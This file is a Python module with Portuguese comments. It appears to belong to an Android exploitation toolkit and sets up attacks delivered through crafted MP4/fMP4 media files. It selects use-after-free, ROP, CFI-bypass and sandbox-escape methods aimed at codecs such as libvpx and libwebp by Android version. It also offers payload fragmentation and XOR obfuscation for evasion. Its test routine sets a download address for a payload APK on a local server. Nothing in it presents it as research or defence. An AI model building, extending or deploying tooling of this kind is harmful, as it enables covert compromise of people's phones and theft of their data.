#!/usr/bin/env python3
"""
Seletor de Método de Exploração
Permite escolher entre método legado (Android 7-9) e moderno (Android 10+)
"""

from enum import Enum
from typing import Tuple, Optional, Dict
from dataclasses import dataclass


class ExploitGeneration(Enum):
    """Gerações de exploração"""
    LEGACY = "legacy"      # Android 7-9 (UAF simples + ROP básico)
    MODERN = "modern"      # Android 10+ (UAF avançado + ROP complexo + fMP4)


class AndroidVersionRange(Enum):
    """Faixas de versão do Android"""
    LEGACY_RANGE = ("7", "8", "8.1", "9")
    MODERN_RANGE = ("10", "11", "12", "13")


@dataclass
class ExploitConfig:
    """Configuração de exploração"""
    generation: ExploitGeneration
    android_version: str
    method: str
    codec: Optional[str] = None
    obfuscate: bool = True
    fragment_count: int = 4
    fragmentation_strategy: str = "interleaved"
    download_url: str = ""
    output_format: str = "mp4"  # mp4 ou fmp4


class ExploitSelector:
    """
    Seleciona o método de exploração apropriado baseado na versão do Android.
    
    Lógica:
    - Android 7-9: Usar método legado (UAF simples + ROP básico + MP4)
    - Android 10+: Usar método moderno (UAF avançado + ROP complexo + fMP4)
    """
    
    def __init__(self):
        """Inicializa o seletor"""
        self.config = None
    
    def get_android_generation(self, version: str) -> ExploitGeneration:
        """
        Determina a geração de exploração baseada na versão.
        
        Args:
            version: Versão do Android (ex: "9", "10", "12")
            
        Returns:
            ExploitGeneration: Geração apropriada
        """
        
        if version in AndroidVersionRange.LEGACY_RANGE.value:
            return ExploitGeneration.LEGACY
        elif version in AndroidVersionRange.MODERN_RANGE.value:
            return ExploitGeneration.MODERN
        else:
            raise ValueError(f"Versão Android não suportada: {version}")
    
    def get_available_methods(self, generation: ExploitGeneration) -> Dict[str, str]:
        """
        Retorna métodos disponíveis para uma geração.
        
        Args:
            generation: Geração de exploração
            
        Returns:
            Dict: Métodos disponíveis com descrições
        """
        
        if generation == ExploitGeneration.LEGACY:
            return {
                "uaf": "Use-After-Free (UAF) - Estável, recomendado",
                "rop": "Return-Oriented Programming (ROP) - Complexo",
                "hybrid": "Híbrido (UAF + ROP) - Mais robusto",
            }
        else:  # MODERN
            return {
                "uaf_codec": "UAF em Codec (libvpx/libwebp) - Recomendado",
                "rop_cfi_bypass": "ROP com Bypass CFI - Avançado",
                "sandbox_escape": "Sandbox Escape completo - Máxima evasão",
            }
    
    def get_available_codecs(self, generation: ExploitGeneration) -> Dict[str, str]:
        """
        Retorna codecs disponíveis para uma geração.
        
        Args:
            generation: Geração de exploração
            
        Returns:
            Dict: Codecs disponíveis com descrições
        """
        
        if generation == ExploitGeneration.LEGACY:
            return {
                "mediaserver": "Mediaserver (padrão)",
            }
        else:  # MODERN
            return {
                "libvpx": "VP8/VP9 Codec (libvpx.so) - Recomendado",
                "libwebp": "WebP Codec (libwebp.so) - Alternativo",
                "libopus": "Opus Audio (libopus.so) - Alternativo",
            }
    
    def get_available_fragmentation_strategies(self) -> Dict[str, str]:
        """
        Retorna estratégias de fragmentação disponíveis.
        
        Returns:
            Dict: Estratégias com descrições
        """
        
        return {
            "linear": "Linear - Payload sequencial",
            "interleaved": "Intercalado - Payload + dados legítimos (padrão)",
            "obfuscated": "Ofuscado - Payload com XOR",
        }
    
    def create_config(
        self,
        android_version: str,
        method: str,
        codec: Optional[str] = None,
        obfuscate: bool = True,
        fragment_count: int = 4,
        fragmentation_strategy: str = "interleaved",
        download_url: str = "",
    ) -> ExploitConfig:
        """
        Cria configuração de exploração.
        
        Args:
            android_version: Versão do Android
            method: Método de exploração
            codec: Codec a explorar (para Modern)
            obfuscate: Se deve ofuscar
            fragment_count: Número de fragments (para Modern)
            fragmentation_strategy: Estratégia de fragmentação
            download_url: URL do servidor
            
        Returns:
            ExploitConfig: Configuração criada
        """
        
        generation = self.get_android_generation(android_version)
        
        # Validar método
        available_methods = self.get_available_methods(generation)
        if method not in available_methods:
            raise ValueError(f"Método inválido: {method}")
        
        # Validar codec
        if generation == ExploitGeneration.MODERN:
            if codec is None:
                codec = "libvpx"  # Padrão
            
            available_codecs = self.get_available_codecs(generation)
            if codec not in available_codecs:
                raise ValueError(f"Codec inválido: {codec}")
        
        # Determinar formato de saída
        if generation == ExploitGeneration.LEGACY:
            output_format = "mp4"
        else:
            output_format = "fmp4"
        
        self.config = ExploitConfig(
            generation=generation,
            android_version=android_version,
            method=method,
            codec=codec,
            obfuscate=obfuscate,
            fragment_count=fragment_count,
            fragmentation_strategy=fragmentation_strategy,
            download_url=download_url,
            output_format=output_format,
        )
        
        return self.config
    
    def get_config_summary(self) -> str:
        """
        Retorna resumo da configuração.
        
        Returns:
            str: Resumo formatado
        """
        
        if self.config is None:
            return "Nenhuma configuração criada"
        
        summary = f"""
╔════════════════════════════════════════╗
║       CONFIGURAÇÃO DE EXPLORAÇÃO       ║
╚════════════════════════════════════════╝

Versão Android:        {self.config.android_version}
Geração:               {self.config.generation.value.upper()}
Método:                {self.config.method}
Codec:                 {self.config.codec or 'N/A'}
Ofuscação:             {'Ativada' if self.config.obfuscate else 'Desativada'}
Formato de Saída:      {self.config.output_format.upper()}

"""
        
        if self.config.generation == ExploitGeneration.MODERN:
            summary += f"""Configurações Modernas:
  - Fragments:         {self.config.fragment_count}
  - Estratégia:        {self.config.fragmentation_strategy}
  - Bypass CFI:        Sim
  - Bypass ASLR:       Sim
  - Sandbox Escape:    Sim
"""
        else:
            summary += f"""Configurações Legadas:
  - NOP Sled:          512 bytes
  - ROP Chain:         Ativada
  - Ofuscação:         {'Ativada' if self.config.obfuscate else 'Desativada'}
"""
        
        summary += f"""
URL do Servidor:       {self.config.download_url or 'Não especificada'}
"""
        
        return summary
    
    def get_recommended_config(self, android_version: str) -> ExploitConfig:
        """
        Retorna configuração recomendada para uma versão.
        
        Args:
            android_version: Versão do Android
            
        Returns:
            ExploitConfig: Configuração recomendada
        """
        
        generation = self.get_android_generation(android_version)
        
        if generation == ExploitGeneration.LEGACY:
            # Recomendação para Android 7-9
            return self.create_config(
                android_version=android_version,
                method="uaf",
                obfuscate=True,
            )
        else:
            # Recomendação para Android 10+
            return self.create_config(
                android_version=android_version,
                method="uaf_codec",
                codec="libvpx",
                obfuscate=True,
                fragment_count=4,
                fragmentation_strategy="interleaved",
            )


def display_version_selector() -> str:
    """
    Exibe menu de seleção de versão.
    
    Returns:
        str: Versão selecionada
    """
    
    print("\n" + "="*50)
    print("SELEÇÃO DE VERSÃO DO ANDROID")
    print("="*50)
    
    print("\n[MÉTODO LEGADO - Android 7-9]")
    print("  1) Android 7.0")
    print("  2) Android 8.0")
    print("  3) Android 8.1")
    print("  4) Android 9.0")
    
    print("\n[MÉTODO MODERNO - Android 10+]")
    print("  5) Android 10.0")
    print("  6) Android 11.0")
    print("  7) Android 12.0")
    print("  8) Android 13.0")
    
    version_map = {
        "1": "7",
        "2": "8",
        "3": "8.1",
        "4": "9",
        "5": "10",
        "6": "11",
        "7": "12",
        "8": "13",
    }
    
    choice = input("\nEscolha (1-8, padrão 8): ").strip() or "8"
    
    if choice not in version_map:
        print("[!] Escolha inválida, usando padrão (Android 13)")
        return "13"
    
    return version_map[choice]


def display_method_selector(generation: ExploitGeneration) -> str:
    """
    Exibe menu de seleção de método.
    
    Args:
        generation: Geração de exploração
        
    Returns:
        str: Método selecionado
    """
    
    selector = ExploitSelector()
    methods = selector.get_available_methods(generation)
    
    print("\n" + "="*50)
    print("SELEÇÃO DE MÉTODO DE EXPLORAÇÃO")
    print("="*50)
    
    for i, (key, desc) in enumerate(methods.items(), 1):
        print(f"  {i}) {key.upper():<20} - {desc}")
    
    method_list = list(methods.keys())
    choice = input(f"\nEscolha (1-{len(methods)}, padrão 1): ").strip() or "1"
    
    try:
        idx = int(choice) - 1
        if 0 <= idx < len(method_list):
            return method_list[idx]
    except ValueError:
        pass
    
    return method_list[0]


def display_codec_selector(generation: ExploitGeneration) -> Optional[str]:
    """
    Exibe menu de seleção de codec.
    
    Args:
        generation: Geração de exploração
        
    Returns:
        str: Codec selecionado ou None
    """
    
    if generation == ExploitGeneration.LEGACY:
        return None
    
    selector = ExploitSelector()
    codecs = selector.get_available_codecs(generation)
    
    print("\n" + "="*50)
    print("SELEÇÃO DE CODEC")
    print("="*50)
    
    for i, (key, desc) in enumerate(codecs.items(), 1):
        print(f"  {i}) {key.upper():<20} - {desc}")
    
    codec_list = list(codecs.keys())
    choice = input(f"\nEscolha (1-{len(codecs)}, padrão 1): ").strip() or "1"
    
    try:
        idx = int(choice) - 1
        if 0 <= idx < len(codec_list):
            return codec_list[idx]
    except ValueError:
        pass
    
    return codec_list[0]


def display_fragmentation_selector() -> str:
    """
    Exibe menu de seleção de estratégia de fragmentação.
    
    Returns:
        str: Estratégia selecionada
    """
    
    selector = ExploitSelector()
    strategies = selector.get_available_fragmentation_strategies()
    
    print("\n" + "="*50)
    print("SELEÇÃO DE ESTRATÉGIA DE FRAGMENTAÇÃO")
    print("="*50)
    
    for i, (key, desc) in enumerate(strategies.items(), 1):
        print(f"  {i}) {key.upper():<20} - {desc}")
    
    strategy_list = list(strategies.keys())
    choice = input(f"\nEscolha (1-{len(strategies)}, padrão 2): ").strip() or "2"
    
    try:
        idx = int(choice) - 1
        if 0 <= idx < len(strategy_list):
            return strategy_list[idx]
    except ValueError:
        pass
    
    return strategy_list[1]


def main():
    """Teste do seletor"""
    
    selector = ExploitSelector()
    
    # Teste 1: Android 9 (Legado)
    print("[*] Teste 1: Android 9 (Legado)")
    config = selector.create_config(
        android_version="9",
        method="uaf",
        obfuscate=True,
        download_url="http://192.168.1.100:8080/payload.apk"
    )
    print(selector.get_config_summary())
    
    # Teste 2: Android 12 (Moderno)
    print("\n[*] Teste 2: Android 12 (Moderno)")
    config = selector.create_config(
        android_version="12",
        method="uaf_codec",
        codec="libvpx",
        obfuscate=True,
        fragment_count=4,
        fragmentation_strategy="interleaved",
        download_url="http://192.168.1.100:8080/payload.apk"
    )
    print(selector.get_config_summary())


if __name__ == "__main__":
    main()
